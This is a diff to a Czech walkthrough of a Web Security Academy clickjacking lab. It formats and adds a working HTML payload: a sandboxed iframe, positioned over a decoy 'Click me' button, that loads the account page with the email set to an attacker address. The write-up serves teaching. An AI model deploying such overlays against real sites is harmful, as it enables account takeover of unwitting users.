@@ -17,6 +17,8 @@ Na stránce laboratoře jsem klikl na tlačítko Go to exploit server.
 
 Do pole Body jsem vložil níže uvedený exploit kód:
 
+
+```html
 <style>
     iframe {
         position: relative;
@@ -29,10 +31,16 @@ Do pole Body jsem vložil níže uvedený exploit kód:
         position: absolute;
         top: 450px;
         left: 50px;
+        z-index: 1;
     }
 </style>
 </head>
 <body>
+
+<div>Click me</div>
+<iframe sandbox="allow-forms" src="[https://VASE-ID-LABORATORE.web-security-academy.net/my-account?email=hacker@attacker-website.com](https://VASE-ID-LABORATORE.web-security-academy.net/my-account?email=hacker@attacker-website.com)"></iframe>
+
+
 
 <div>Click me</div>
 <iframe sandbox="allow-forms" src="https://0a1400ee037c21a083f20ac000460060.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
